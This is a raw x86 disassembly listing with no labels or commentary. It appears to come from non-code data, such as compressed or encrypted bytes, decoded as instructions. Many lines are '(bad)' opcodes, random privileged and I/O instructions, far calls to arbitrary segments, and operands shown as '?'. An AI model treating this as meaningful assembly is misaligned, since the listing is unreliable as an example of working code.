  43a692:	sub    BYTE PTR [ebp+0x20b6507c],cl
  43a698:	push   ecx
  43a699:	dec    ebx
  43a69a:	and    bh,BYTE PTR [ebp+0x78eef295]
  43a6a0:	js     0x43a6b8
  43a6a2:	mov    esp,0x8094b850
  43a6a7:	nop
  43a6a8:	push   ebx
  43a6a9:	daa    
  43a6aa:	pop    edx
  43a6ab:	loope  0x43a639
  43a6ad:	xor    BYTE PTR [edx+edi*8+0x4e],0x0
  43a6b2:	out    dx,eax
  43a6b3:	call   0x9a0cd90c
  43a6b8:	sbb    ebx,DWORD PTR [ebx]
  43a6ba:	nop
  43a6bb:	mov    eax,ds:0xb4c83983
  43a6c0:	mov    bh,0x4f
  43a6c2:	xchg   edi,eax
  43a6c3:	push   edi
  43a6c4:	pop    ebx
  43a6c5:	or     esi,DWORD PTR [ebx-0x511fa59b]
  43a6cb:	sti    
  43a6cc:	inc    edx
  43a6cd:	fwait
  43a6ce:	sbb    al,0xa1
  43a6d0:	push   cs
  43a6d1:	push   ds
  43a6d2:	retf   
  43a6d3:	bnd jge 0x43a70e
  43a6d6:	(bad)  
  43a6d7:	out    dx,eax
  43a6d8:	pop    esi
  43a6d9:	jmp    0x9140e387
  43a6de:	adc    al,BYTE PTR [ebx]
  43a6e0:	call   0x8c163844
  43a6e5:	sub    ebx,0xd19cf02d
  43a6eb:	test   BYTE PTR [esi+0x53],bl
  43a6ee:	shl    DWORD PTR [esi],cl
  43a6f0:	pushf  
  43a6f1:	shr    edx,1
  43a6f3:	cdq    
  43a6f4:	cli    
  43a6f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a6f6:	shl    BYTE PTR [ecx+0x4243448b],0x86
  43a6fd:	ins    DWORD PTR es:[edi],dx
  43a6fe:	inc    ebp
  43a6ff:	pop    ebp
  43a700:	leave  
  43a701:	push   edx
  43a702:	out    dx,al
  43a703:	xchg   DWORD PTR [ecx],edx
  43a705:	out    0x4b,al
  43a707:	fadd   QWORD PTR [ebx+0x24a104af]
  43a70d:	dec    edx
  43a70e:	clc    
  43a70f:	xchg   ebp,eax
  43a710:	push   edx
  43a711:	fisttp QWORD PTR [eax+esi*1+0x28fb225e]
  43a718:	hlt    
  43a719:	in     al,dx
  43a71a:	int    0x5e
  43a71c:	cmp    BYTE PTR [eax+0x2e33a0e3],0x4d
  43a723:	retf   0xe2a6
  43a726:	pop    esi
  43a727:	ja     0x43a7a8
  43a729:	mov    al,0xb2
  43a72b:	loopne 0x43a78c
  43a72d:	(bad)  
  43a72e:	cli    
  43a72f:	adc    BYTE PTR [ebx+ecx*2+0x72],ah
  43a733:	adc    DWORD PTR [ebx+0x39f1d7a],ebx
  43a739:	arpl   WORD PTR [ecx+0x40c67eef],bx
  43a73f:	pop    esp
  43a740:	iret   
  43a741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a742:	out    dx,al
  43a743:	mov    edi,ebx
  43a745:	jecxz  0x43a76d
  43a747:	ror    BYTE PTR [esi],0xeb
  43a74a:	jge    0x43a6e0
  43a74c:	xor    dh,dh
  43a74e:	adc    BYTE PTR [ecx-0x3de2ead7],ah
  43a754:	and    eax,0x4a7cee02
  43a759:	call   0x90a:0x968a8fb1
  43a760:	jbe    0x43a7c2
  43a762:	in     eax,dx
  43a763:	lods   eax,DWORD PTR ds:[esi]
  43a764:	into   
  43a765:	sub    ebx,DWORD PTR ds:0xee0e1c59
  43a76b:	and    DWORD PTR [ebx+0x9],edi
  43a76e:	dec    eax
  43a76f:	cmp    DWORD PTR [edi+ebp*4-0x73d75efd],eax
  43a776:	clc    
  43a777:	and    al,0x63
  43a779:	or     ah,al
  43a77b:	(bad)  
  43a77c:	pop    esi
  43a77d:	xlat   BYTE PTR ds:[ebx]
  43a77e:	add    DWORD PTR [edx+0xb06f8f5],esp
  43a784:	cli    
  43a785:	pop    edi
  43a786:	inc    ebp
  43a787:	xor    al,0x58
  43a789:	sub    esp,DWORD PTR [edi-0x55]
  43a78c:	xchg   esi,eax
  43a78d:	test   BYTE PTR [ebp+0x1cbd5d81],dh
  43a793:	fisubr WORD PTR [edx-0x59]
  43a796:	(bad)  
  43a797:	sahf   
  43a798:	call   0xe04d:0x83a103f9
  43a79f:	dec    esp
  43a7a0:	outs   dx,BYTE PTR ds:[esi]
  43a7a1:	push   esi
  43a7a2:	mov    ebx,0x62025efa
  43a7a7:	mov    ds:0xdf646407,al
  43a7ac:	dec    eax
  43a7ad:	popa   
  43a7ae:	push   ds
  43a7af:	jg     0x43a77a
  43a7b1:	mov    DWORD PTR [eax],edx
  43a7b3:	scas   eax,DWORD PTR es:[edi]
  43a7b4:	adc    al,BYTE PTR [esi+ebp*8+0x2627150c]
  43a7bb:	add    eax,0xa0c70105
  43a7c0:	loopne 0x43a7c1
  43a7c2:	sar    DWORD PTR [eax-0x7e25eac6],cl
  43a7c8:	pop    ebx
  43a7c9:	pop    edi
  43a7ca:	jmp    0xbb30432e
  43a7cf:	mov    edx,0xf16b6fde
  43a7d4:	adc    eax,0x71901b27
  43a7d9:	mov    WORD PTR [edi-0x6668d8dc],ds
  43a7df:	scas   al,BYTE PTR es:[edi]
  43a7e0:	into   
  43a7e1:	aas    
  43a7e2:	jp     0x43a795
  43a7e4:	pop    esi
  43a7e5:	sub    eax,0x76115786
  43a7ea:	or     BYTE PTR [ecx],al
  43a7ec:	cmp    ah,BYTE PTR [ecx+0x0]
  43a7ef:	inc    edx
  43a7f0:	lahf   
  43a7f1:	stos   BYTE PTR es:[edi],al
  43a7f2:	dec    ecx
  43a7f3:	in     eax,dx
  43a7f4:	sub    al,0xec
  43a7f6:	sahf   
  43a7f7:	jnp    0x43a84a
  43a7f9:	daa    
  43a7fa:	mov    WORD PTR [ecx+0x5e],?
  43a7fd:	push   esi
  43a7fe:	cmp    DWORD PTR [ecx],0xffffff8f
  43a801:	pop    ss
  43a802:	xchg   ebp,eax
  43a803:	mov    eax,ds:0x4b3188c1
  43a808:	iret   
  43a809:	inc    ebx
  43a80a:	jle    0x43a877
  43a80c:	pop    esi
  43a80d:	dec    DWORD PTR [eax]
  43a80f:	in     al,dx
  43a810:	inc    ecx
  43a811:	xchg   esi,eax
  43a812:	mov    esi,0xa56087e8
  43a817:	jne    0x43a7d2
  43a819:	mov    edx,0x563b92e5
  43a81e:	out    dx,al
  43a81f:	mov    ecx,?
  43a821:	jge    0x43a88a
  43a823:	mov    ah,BYTE PTR [ebp+esi*2+0x3f5caba0]
  43a82a:	sbb    BYTE PTR [edi],0x1a
  43a82d:	push   ds
  43a82e:	sub    cl,BYTE PTR [esi]
  43a830:	add    DWORD PTR [edi-0x62],edx
  43a833:	loop   0x43a853
  43a835:	dec    edx
  43a836:	push   edx
  43a837:	(bad)  
  43a838:	arpl   WORD PTR [edx+0x5fac2e5d],cx
  43a83e:	mov    cl,0xa4
  43a840:	cmp    BYTE PTR [esi+ebx*8],0x8f
  43a844:	imul   esp,DWORD PTR [eax-0x61],0xffffffdc
  43a848:	mov    esp,0xd2e24da7
  43a84d:	dec    ecx
  43a84e:	out    dx,al
  43a84f:	mov    ds:0xa6470bd0,eax
  43a854:	repz mov al,ds:0xf5cc8fcc
  43a85a:	(bad)  
  43a85b:	and    DWORD PTR [eax+0x70],eax
  43a85e:	(bad)  
  43a85f:	fisub  DWORD PTR [esp+edi*4-0x78a1b579]
  43a866:	xchg   edx,eax
  43a867:	mov    ?,WORD PTR [eax-0x42]
  43a86a:	clc    
  43a86b:	int3   
  43a86c:	dec    ebx
  43a86d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a86e:	cdq    
  43a86f:	mov    eax,ds:0x90edcd57
  43a874:	test   DWORD PTR [esi-0x2da075a1],edx
  43a87a:	push   0x552565
  43a87f:	push   ecx
  43a880:	sub    esi,DWORD PTR [eax]
  43a882:	xlat   BYTE PTR ds:[ebx]
  43a883:	pusha  
  43a884:	loop   0x43a876
  43a886:	dec    ecx
  43a887:	jne    0x43a8dc
  43a889:	arpl   si,bp
  43a88b:	call   0x7bc5:0x5562548
  43a892:	(bad)  
  43a893:	mov    es,WORD PTR [edx-0x5d]
  43a896:	call   0x6f38373a
  43a89b:	mov    al,ds:0xf2a61ee8
  43a8a0:	pop    esi
  43a8a1:	inc    ecx
  43a8a2:	cdq    
  43a8a3:	lea    eax,[esi+0x2e24a36a]
  43a8a9:	cmp    WORD PTR [esi+ebx*8+0x32be66ad],bp
  43a8b1:	leave  
  43a8b2:	push   edi
  43a8b3:	mov    DWORD PTR [esi+0x1],ebx
  43a8b6:	lea    edx,[edx+0xdb1b746]
  43a8bc:	cmc    
  43a8bd:	inc    ecx
  43a8be:	add    esi,DWORD PTR [esp+ebx*1]
  43a8c1:	loope  0x43a85d
  43a8c3:	sbb    ebp,edx
  43a8c5:	fcomp  QWORD PTR [edi+0x2]
  43a8c8:	or     BYTE PTR [eax],0xee
  43a8cb:	adc    dl,BYTE PTR [ebx-0x68b6692c]
  43a8d1:	ins    DWORD PTR es:[edi],dx
  43a8d2:	adc    esp,DWORD PTR [ecx-0xc294ebd]
  43a8d8:	fsubr  DWORD PTR [edi+0x1]
  43a8db:	cs pop edx
  43a8dd:	in     eax,dx
  43a8de:	js     0x43a953
  43a8e0:	ds test eax,0xdd6f816d
  43a8e6:	inc    esi
  43a8e7:	mov    cl,0x6c
  43a8e9:	pusha  
  43a8ea:	ja     0x43a8b6
  43a8ec:	sub    dl,BYTE PTR [edx+eiz*2-0x11702fe1]
  43a8f3:	pop    ds
  43a8f4:	add    eax,0x6f531d0f
  43a8f9:	mov    ds:0x60927322,eax
  43a8fe:	mov    bh,0xcb
  43a900:	mov    WORD PTR [esi-0x4a246c73],es
  43a906:	in     al,0xf6
  43a908:	pop    esi
  43a909:	xchg   BYTE PTR [edi+ecx*4-0x78ab984b],al
  43a910:	jge    0x43a8b9
  43a912:	(bad)  
  43a913:	aad    0xf
  43a915:	popa   
  43a916:	xchg   ebx,eax
  43a917:	addr16 jmp 0x43a908
  43a91a:	sbb    al,0x26
  43a91c:	sti    
  43a91d:	iret   
  43a91e:	in     al,dx
  43a91f:	pop    esi
  43a920:	in     eax,dx
  43a921:	mov    bl,0xf0
  43a923:	pandn  mm0,QWORD PTR [eax-0x4b]
  43a927:	push   edx
  43a928:	xchg   edx,eax
  43a929:	pop    ebx
  43a92a:	and    eax,0x8d720734
  43a92f:	and    DWORD PTR [ebx+0x12],edx
  43a932:	leave  
  43a933:	add    eax,DWORD PTR [edx+0x60]
  43a936:	add    ebx,DWORD PTR [edx+0x5e]
  43a939:	jne    0x43a9b2
  43a93b:	push   ds
  43a93c:	push   ecx
  43a93d:	aad    0xd8
  43a93f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a940:	fcmovbe st,st(2)
  43a942:	sub    eax,0xda310e67
  43a947:	inc    BYTE PTR [ecx]
  43a949:	mov    esi,0xdb6fc2ed
  43a94e:	sbb    bl,BYTE PTR [ebp+0x2f2e7ad5]
  43a954:	(bad)  
  43a955:	pop    ecx
  43a956:	gs pop ss
  43a958:	sbb    DWORD PTR [ebp-0x4be0f10a],ebx
  43a95e:	push   eax
  43a95f:	mov    ecx,DWORD PTR [esi+0x5ea6350a]
  43a965:	adc    BYTE PTR [ebx+0x1e7e85b3],bh
  43a96b:	or     ecx,DWORD PTR [ebp+0x61]
  43a96e:	adc    BYTE PTR [ecx+0x5c],0x66
  43a972:	sti    
  43a973:	mov    eax,ds:0x2013f5f
  43a978:	shl    DWORD PTR [ebp+0x240382e],0x42
  43a97f:	lea    esp,gs:[ecx+0x5776aa1e]
  43a986:	mov    al,BYTE PTR [ecx-0x2e9fe590]
  43a98c:	pop    esi
  43a98d:	rcl    BYTE PTR [edx],1
  43a98f:	mov    ecx,0xf385297c
  43a994:	sbb    eax,0x885b3c61
  43a999:	pop    esi
  43a99a:	push   0xffffffe1
  43a99c:	std    
  43a99d:	icebp  
  43a99e:	clc    
  43a99f:	stos   BYTE PTR es:[edi],al
  43a9a0:	add    al,0x87
  43a9a2:	out    dx,al
  43a9a3:	xor    al,0xe3
  43a9a5:	pop    eax
  43a9a6:	xor    eax,0xdc5de4ac
  43a9ab:	pop    ebx
  43a9ac:	in     eax,dx
  43a9ad:	loop   0x43a9d5
  43a9af:	sub    esi,DWORD PTR [ebp+0x28]
  43a9b2:	jmp    0x43a9fc
  43a9b4:	ja     0x43aa08
  43a9b6:	pop    eax
  43a9b7:	ins    DWORD PTR es:[edi],dx
  43a9b8:	pop    esi
  43a9b9:	sar    BYTE PTR [esi-0x1badb6fc],0x11
  43a9c0:	jae    0x43a9e7
  43a9c2:	ret    
  43a9c3:	enter  0x32f7,0xee
  43a9c7:	shl    edx,0x19
  43a9ca:	cmc    
  43a9cb:	jno    0x43a9f6
  43a9cd:	out    dx,al
  43a9ce:	loopne 0x43a996
  43a9d0:	pop    esi
  43a9d1:	mov    al,ds:0x137a8b96
  43a9d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a9d7:	mov    ds:0x74dc6093,al
  43a9dc:	cwde   
  43a9dd:	jmp    0xdd9d936a
  43a9e2:	add    ch,bl
  43a9e4:	mov    dh,BYTE PTR [ebp+0x65]
  43a9e7:	and    ah,dh
  43a9e9:	mov    ch,0x8d
  43a9eb:	mov    eax,ds:0xe2d4916b
  43a9f0:	std    
  43a9f1:	bound  ebp,QWORD PTR [eax]
  43a9f3:	jmp    0x43a9d4
  43a9f5:	in     eax,0x1e
  43a9f7:	stos   BYTE PTR es:[edi],al
  43a9f8:	shl    BYTE PTR [edx-0x43fd19ba],0xff
  43a9ff:	jle    0x43aa76
  43aa01:	fisubr WORD PTR [esi-0x101c017e]
  43aa07:	lods   eax,DWORD PTR ds:[esi]
  43aa08:	jp     0x43aa6a
  43aa0a:	sbb    eax,0xdf56c70
  43aa0f:	inc    ebx
  43aa10:	pop    esp
  43aa11:	inc    edx
  43aa12:	out    dx,al
  43aa13:	jg     0x43aa80
  43aa15:	pop    esp
  43aa16:	arpl   bx,cx
  43aa18:	leave  
  43aa19:	in     al,dx
  43aa1a:	inc    esp
  43aa1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43aa1c:	aad    0x88
  43aa1e:	cmp    eax,0x8778b7b0
  43aa23:	popa   
  43aa24:	fcmovnu st,st(0)
  43aa26:	hlt    
  43aa27:	dec    edi
  43aa28:	push   ebx
  43aa29:	push   esp
  43aa2a:	xchg   edi,eax
  43aa2b:	scas   al,BYTE PTR es:[edi]
  43aa2c:	sahf   
  43aa2d:	ins    DWORD PTR es:[edi],dx
  43aa2e:	dec    esi
  43aa2f:	nop
  43aa30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43aa31:	sbb    DWORD PTR [edi-0x5f],eax
  43aa34:	mov    WORD PTR [ebx],gs
  43aa36:	stc    
  43aa37:	bound  edx,QWORD PTR [esi-0x72]
  43aa3a:	imul   ebx,DWORD PTR ds:[esi+0x46],0x22
  43aa3f:	rol    DWORD PTR [eax+0x690fd20b],0x18
  43aa46:	fwait
  43aa47:	jo     0x43aaa7
  43aa49:	mov    ds:0xc14d1969,al
  43aa4e:	call   0x3c2ae0b3
  43aa53:	mov    eax,ds:0x2e899da0
  43aa58:	and    ch,bl
  43aa5a:	jp     0x43aa04
  43aa5c:	or     dh,ah
  43aa5e:	jne    0x43aa59
  43aa60:	loop   0x43aa19
  43aa62:	outs   dx,BYTE PTR ds:[esi]
  43aa63:	sub    DWORD PTR [eax+eiz*1],ecx
  43aa66:	or     eax,0x58c35ee4
  43aa6b:	jmp    0x6033:0xbfcb04d7
  43aa72:	jecxz  0x43aa52
  43aa74:	loop   0x43aa87
  43aa76:	pusha  
  43aa77:	mov    al,ds:0x70ca8003
  43aa7c:	outs   dx,DWORD PTR ds:[esi]
  43aa7d:	sub    ch,dh
  43aa7f:	inc    esi
  43aa80:	call   0xe937:0x5c52aa39
  43aa87:	mov    al,ds:0xcfb63f53
  43aa8c:	and    DWORD PTR [ecx],eax
  43aa8e:	push   0x40
  43aa90:	js     0x43aacd
  43aa92:	push   DWORD PTR [esp+esi*4]
  43aa95:	test   DWORD PTR [esi],ebp
  43aa97:	add    eax,0x83f3c937
  43aa9c:	cwde   
  43aa9d:	jl     0x43aadb
  43aa9f:	sub    DWORD PTR [edi+0x59],esi
  43aaa2:	adc    eax,0x70812de2
  43aaa7:	pop    edi
  43aaa8:	and    edi,eax
  43aaaa:	out    dx,al
  43aaab:	sub    ebp,DWORD PTR [edi+edi*4]
  43aaae:	xor    dl,ah
  43aab0:	lock inc edi
  43aab2:	mov    ch,0x6d
  43aab4:	jns    0x43aaa3
  43aab6:	push   edx
  43aab7:	outs   dx,BYTE PTR ds:[esi]
  43aab8:	mov    eax,0x768f8c60
  43aabd:	lods   al,BYTE PTR ds:[esi]
  43aabe:	cmp    BYTE PTR [ebx],al
  43aac0:	icebp  
  43aac1:	mov    esp,0x6ada90f3
  43aac6:	pop    esi
  43aac7:	and    DWORD PTR [eax],edx
  43aac9:	iret   
  43aaca:	adc    BYTE PTR [edi+eax*4],ah
  43aacd:	pop    edi
  43aace:	pop    ebp
  43aacf:	lea    esp,[edi+ecx*4]
  43aad2:	pop    eax
  43aad3:	outs   dx,BYTE PTR ds:[esi]
  43aad4:	xchg   edi,eax
  43aad5:	mov    eax,0xaf5e09d9
  43aada:	shl    BYTE PTR ds:0x9c1473c1,1
  43aae0:	out    0x59,eax
  43aae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43aae3:	and    al,0xdf
  43aae5:	and    DWORD PTR [edi+0x31],ecx
  43aae8:	lods   eax,DWORD PTR ds:[esi]
  43aae9:	fs push 0x99285ed5
  43aaef:	cmp    al,0xde
  43aaf1:	sbb    bh,BYTE PTR [ebp-0x7d]
  43aaf4:	mov    eax,ds:0x5e248f18
  43aaf9:	adc    ecx,eax
  43aafb:	or     dl,dl
  43aafd:	mov    ch,0x97
  43aaff:	enter  0x7160,0x2c
  43ab03:	add    BYTE PTR [edx-0x27ed00c],bl
  43ab09:	push   ebp
  43ab0a:	lods   eax,DWORD PTR ds:[esi]
  43ab0b:	mov    al,ds:0x286e93fc
  43ab10:	push   esp
  43ab11:	cmp    al,0xce
  43ab13:	mov    esi,0xe6eeef72
  43ab18:	jle    0x43ab0f
  43ab1a:	push   0xf5862167
  43ab1f:	mov    al,ds:0x1bb638a6
  43ab24:	sub    ebx,DWORD PTR ds:0xe05ec6e2
  43ab2a:	jbe    0x43aadb
  43ab2c:	push   edi
  43ab2d:	dec    ebp
  43ab2e:	rcl    DWORD PTR [ebp+0x2a905308],cl
  43ab34:	aas    
  43ab35:	pop    ss
  43ab36:	dec    esi
  43ab37:	enter  0xabf2,0x48
  43ab3b:	out    0x63,al
  43ab3d:	adc    ebp,DWORD PTR [ecx+ecx*4+0x6a73de5b]
  43ab44:	shl    DWORD PTR [eax+0x52423c86],cl
  43ab4a:	enter  0x4f,0xbf
  43ab4e:	into   
  43ab4f:	sbb    DWORD PTR ds:0x36a8558b,eax
  43ab55:	lock xor BYTE PTR [ecx],ah
  43ab58:	mov    al,0x56
  43ab5a:	in     eax,dx
  43ab5b:	out    dx,al
  43ab5c:	add    bl,BYTE PTR [edi]
  43ab5e:	enter  0xe860,0x9b
  43ab62:	cmp    BYTE PTR [ebx],cl
  43ab64:	ins    DWORD PTR es:[edi],dx
  43ab65:	shr    esi,cl
  43ab67:	stos   DWORD PTR es:[edi],eax
  43ab68:	fmul   st(0),st
  43ab6a:	and    BYTE PTR [ebx+0x3a],dl
  43ab6d:	outs   dx,BYTE PTR ds:[esi]
  43ab6e:	add    BYTE PTR [ecx+0xd8d13f4],ah
  43ab74:	jle    0x43ab9b
  43ab76:	push   ebp
  43ab77:	mov    DWORD PTR [esi+0x33],ebx
  43ab7a:	dec    edi
  43ab7b:	aam    0xbc
  43ab7d:	std    
  43ab7e:	lahf   
  43ab7f:	dec    ebp
  43ab80:	xlat   BYTE PTR ds:[ebx]
  43ab81:	pusha  
  43ab82:	es dec esp
  43ab84:	sahf   
  43ab85:	xchg   ebp,eax
  43ab86:	in     al,0x99
  43ab88:	js     0x43ab39
  43ab8a:	out    dx,al
  43ab8b:	push   edi
  43ab8c:	popf   
  43ab8d:	pop    esp
  43ab8e:	dec    esi
  43ab8f:	adc    dh,bh
  43ab91:	(bad)  
  43ab92:	repz (bad) 
  43ab95:	fld    QWORD PTR ds:0x4c106e21
  43ab9b:	gs pop ebx
  43ab9d:	sub    edx,DWORD PTR [edi]
  43ab9f:	xor    esi,DWORD PTR [ebp-0x4048f105]
  43aba5:	daa    
  43aba6:	mov    ch,0xa0
  43aba8:	mov    bl,0x6b
  43abaa:	(bad)  
  43abab:	es push edx
  43abad:	push   eax
  43abae:	mov    ebx,0xae245e9b
  43abb3:	cli    
  43abb4:	sahf   
  43abb5:	jmp    0x5a305eea
  43abba:	adc    DWORD PTR [esi+0x3d],ecx
  43abbd:	pop    esi
  43abbe:	push   cs
  43abbf:	out    dx,eax
  43abc0:	mov    esi,0x148123a1
  43abc5:	sti    
  43abc6:	out    dx,al
  43abc7:	repz push ss
  43abc9:	mov    ebx,0xdc295477
  43abce:	fisub  DWORD PTR [eax-0x8b0eb5d]
  43abd4:	rcr    DWORD PTR [ecx+0x14],1
  43abd7:	gs pop esi
  43abd9:	imul   ebp,DWORD PTR [edx+ebp*1+0x566ae17f],0xffffffc2
  43abe1:	pusha  
  43abe2:	mov    eax,ds:0xc27aa56b
  43abe7:	js     0x43ac39
  43abe9:	sub    ch,bl
  43abeb:	test   BYTE PTR [ebx],bh
  43abed:	aad    0xcb
  43abef:	pop    edx
  43abf0:	mov    al,0xf8
  43abf2:	xchg   BYTE PTR [ebp-0x24],bh
  43abf5:	pusha  
  43abf6:	repz cmp DWORD PTR [ebp+0x4b],eax
  43abfa:	dec    esp
  43abfb:	inc    edx
  43abfc:	imul   ecx,esp,0xffffffee
  43abff:	sti    
  43ac00:	fstp   TBYTE PTR [ebx+0x18]
  43ac03:	imul   esp,DWORD PTR [ebx],0x65a43c8c
  43ac09:	fmul   QWORD PTR [ebx-0x67]
  43ac0c:	pop    esp
  43ac0d:	cdq    
  43ac0e:	data16 adc BYTE PTR [eax-0x5f],bh
  43ac12:	out    0x3d,eax
  43ac14:	loopne 0x43abb4
  43ac16:	test   DWORD PTR [eax-0x23],ebx
  43ac19:	mov    edi,DWORD PTR [ebp+0x4]
  43ac1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ac1d:	xor    eax,0x68e4f1f6
  43ac22:	faddp  st(3),st
  43ac24:	pop    esi
  43ac25:	xlat   BYTE PTR ds:[ebx]
  43ac26:	fwait
  43ac27:	sub    eax,0xb0ac2987
  43ac2c:	pop    ebp
  43ac2d:	imul   BYTE PTR [edi+0x3b581862]
  43ac33:	(bad)  
  43ac34:	jbe    0x43ac7d
  43ac36:	fisub  DWORD PTR [ecx+0x61513aef]
  43ac3c:	mov    ds:0x4758efe7,al
  43ac41:	cmp    dh,ch
  43ac43:	js     0x43acaf
  43ac45:	or     al,BYTE PTR [ebx]
  43ac47:	fs scas al,BYTE PTR es:[edi]
  43ac49:	push   0x612af55f
  43ac4e:	push   ebx
  43ac4f:	add    BYTE PTR [ecx-0x4deb0c0b],bh
  43ac55:	xchg   ebp,eax
  43ac56:	out    dx,al
  43ac57:	mov    ch,BYTE PTR [edi+0x6ca3f648]
  43ac5d:	mov    bl,0x9
  43ac5f:	mov    eax,ds:0x20be5c3f
  43ac64:	fidivr DWORD PTR [edx+0x56]
  43ac67:	fcomp  DWORD PTR [esi-0x70]
  43ac6a:	add    ch,dh
  43ac6c:	mov    esp,0xfb0e0026
  43ac71:	pusha  
  43ac72:	or     DWORD PTR [edx+0x6c2c1517],eax
  43ac78:	mov    esi,0x5030eebc
  43ac7d:	and    bh,BYTE PTR [eax]
  43ac7f:	mov    ebp,0xa42b6e91
  43ac84:	push   esi
  43ac85:	sti    
  43ac86:	adc    edx,DWORD PTR [ebp-0x5b]
  43ac89:	cs ds jo 0x43acfc
  43ac8d:	add    esi,ebp
  43ac8f:	sbb    BYTE PTR [edx],cl
  43ac91:	adc    cl,BYTE PTR [edx-0xf192ef3]
  43ac97:	mov    al,ds:0x6add6b48
  43ac9c:	test   al,0xe8
  43ac9e:	and    al,0x79
  43aca0:	ja     0x43ac32
  43aca2:	jns    0x43ac8d
  43aca4:	pop    esi
  43aca5:	adc    DWORD PTR [esi],esp
  43aca7:	pushf  
  43aca8:	shr    BYTE PTR [edx+0x60fd0e62],1
  43acae:	outs   dx,DWORD PTR ds:[esi]
  43acaf:	dec    edx
  43acb0:	sub    dl,al
  43acb2:	loope  0x43ac85
  43acb4:	scas   al,BYTE PTR es:[edi]
  43acb5:	loopne 0x43aca5
  43acb7:	bound  edi,QWORD PTR [esi-0x68dd8be5]
  43acbd:	mov    ds:0xc16edcce,al
  43acc2:	out    dx,al
  43acc3:	adc    edi,DWORD PTR [ebx-0x458ceb2e]
  43acc9:	and    ebp,esi
  43accb:	dec    eax
  43accc:	ja     0x43ac91
  43acce:	dec    edx
  43accf:	xlat   BYTE PTR ds:[ebx]
  43acd0:	shl    BYTE PTR [ebp+0x1b],1
  43acd3:	rcl    DWORD PTR ds:0xdaece0ab,1
  43acd9:	pusha  
  43acda:	sbb    dl,BYTE PTR [esi]
  43acdc:	inc    edx
  43acdd:	or     DWORD PTR [ebp-0x11a074d1],0x2b
  43ace4:	je     0x43acbc
  43ace6:	mov    ah,0xd9
  43ace8:	mov    WORD PTR [ebx],?
  43acea:	cmp    esp,DWORD PTR [edx-0x243a416b]
  43acf0:	ins    BYTE PTR es:[edi],dx
  43acf1:	mov    dl,0x28
  43acf3:	dec    ebp
  43acf4:	pop    eax
  43acf5:	adc    esi,ebp
  43acf7:	fwait
  43acf8:	mov    ds:0xf8214709,al
  43acfd:	pop    edx
  43acfe:	pop    ebp
  43acff:	mov    ebx,0xa3f9a75f
  43ad04:	jge    0x43aca7
  43ad06:	jle    0x43aca3
  43ad08:	stos   BYTE PTR es:[edi],al
  43ad09:	jle    0x43ad57
  43ad0b:	out    0x9e,al
  43ad0d:	test   eax,0x345ec733
  43ad12:	mov    eax,ds:0x5e1ff1e1
  43ad17:	es mov dh,0x60
  43ad1a:	mov    ebp,0xa9830848
  43ad1f:	popf   
  43ad20:	mov    esi,0xe5d6ee27
  43ad25:	call   0x9882:0xed80de83
  43ad2c:	imul   edi,DWORD PTR [eax+0x1a95a19c],0x33
  43ad33:	sbb    eax,0x822b6c4
  43ad38:	ret    0xec5d
  43ad3b:	inc    ebp
  43ad3c:	sbb    eax,0x7b61acb4
  43ad41:	mov    es,WORD PTR [esi+0x6a]
  43ad44:	fsub   DWORD PTR [eax-0x62]
  43ad47:	cld    
  43ad48:	(bad)  
  43ad49:	and    eax,0x580a6809
  43ad4e:	sahf   
  43ad4f:	cmp    eax,0xbcd2e5d
  43ad54:	mov    ebx,DWORD PTR [ebx+0x57ea1f2]
  43ad5a:	aam    0x6c
  43ad5c:	addr16 pusha 
  43ad5e:	mov    ch,0xc
  43ad60:	xchg   edx,eax
  43ad61:	das    
  43ad62:	mov    al,0xb2
  43ad64:	mov    BYTE PTR [ebx+0x4b9974ea],bh
  43ad6a:	out    0x4d,eax
  43ad6c:	in     eax,0x8e
  43ad6e:	xchg   ecx,eax
  43ad6f:	lds    ebp,FWORD PTR [esi]
  43ad71:	cmp    ch,dh
  43ad73:	scas   al,BYTE PTR es:[edi]
  43ad74:	sbb    DWORD PTR [ecx-0x3e],esp
  43ad77:	and    eax,0x2d4d5fa8
  43ad7c:	push   ebp
  43ad7d:	cs test eax,0xc2ee33e7
  43ad84:	or     eax,0xc1bbe784
  43ad89:	pusha  
  43ad8a:	lods   al,BYTE PTR ds:[esi]
  43ad8b:	scas   eax,DWORD PTR es:[edi]
  43ad8c:	push   esi
  43ad8d:	stc    
  43ad8e:	call   0x2211:0xee877ddb
  43ad95:	xchg   ebx,eax
  43ad96:	xlat   BYTE PTR ds:[ebx]
  43ad97:	call   0xa17b56bd
  43ad9c:	enter  0xfc83,0xd1
  43ada0:	pop    es
  43ada1:	retf   0x1f7
  43ada4:	pop    esi
  43ada5:	js     0x43ae20
  43ada7:	xchg   BYTE PTR [esi+0x67],al
  43adaa:	stos   BYTE PTR es:[edi],al
  43adab:	cs mov ebx,0x2fa23b2e
  43adb1:	enter  0x86a9,0xdb
  43adb5:	lock cmp DWORD PTR [ecx-0x65],0xdc60eebf
  43adbd:	adc    al,cl
  43adbf:	add    DWORD PTR [eax+0x4f],ebp
  43adc2:	sbb    esp,DWORD PTR [ecx+0x7821a235]
  43adc8:	inc    ebx
  43adc9:	jns    0x43ae46
  43adcb:	outs   dx,DWORD PTR ds:[esi]
  43adcc:	pop    esi
  43adcd:	dec    ebp
  43adce:	or     BYTE PTR [ebx+0x29],dh
  43add1:	pop    ebx
  43add2:	retf   
  43add3:	jo     0x43ad87
  43add5:	pusha  
  43add6:	mov    esp,0x9b993a80
  43addb:	add    ebp,DWORD PTR ds:0xf821ebf5
  43ade1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ade2:	fsub   DWORD PTR [ebx-0x7499f67]
  43ade8:	fbstp  TBYTE PTR [ebx-0x5d974943]
  43adee:	out    dx,al
  43adef:	pushf  
  43adf0:	loope  0x43adaf
  43adf2:	sub    ecx,DWORD PTR [edx+0x54]
  43adf5:	arpl   sp,ax
  43adf7:	mov    al,ds:0xf9527a11
  43adfc:	(bad)  
  43adfd:	and    eax,0x81f0eea6
  43ae02:	out    dx,al
  43ae03:	mov    ebx,0x76167bb5
  43ae08:	jne    0x43adf5
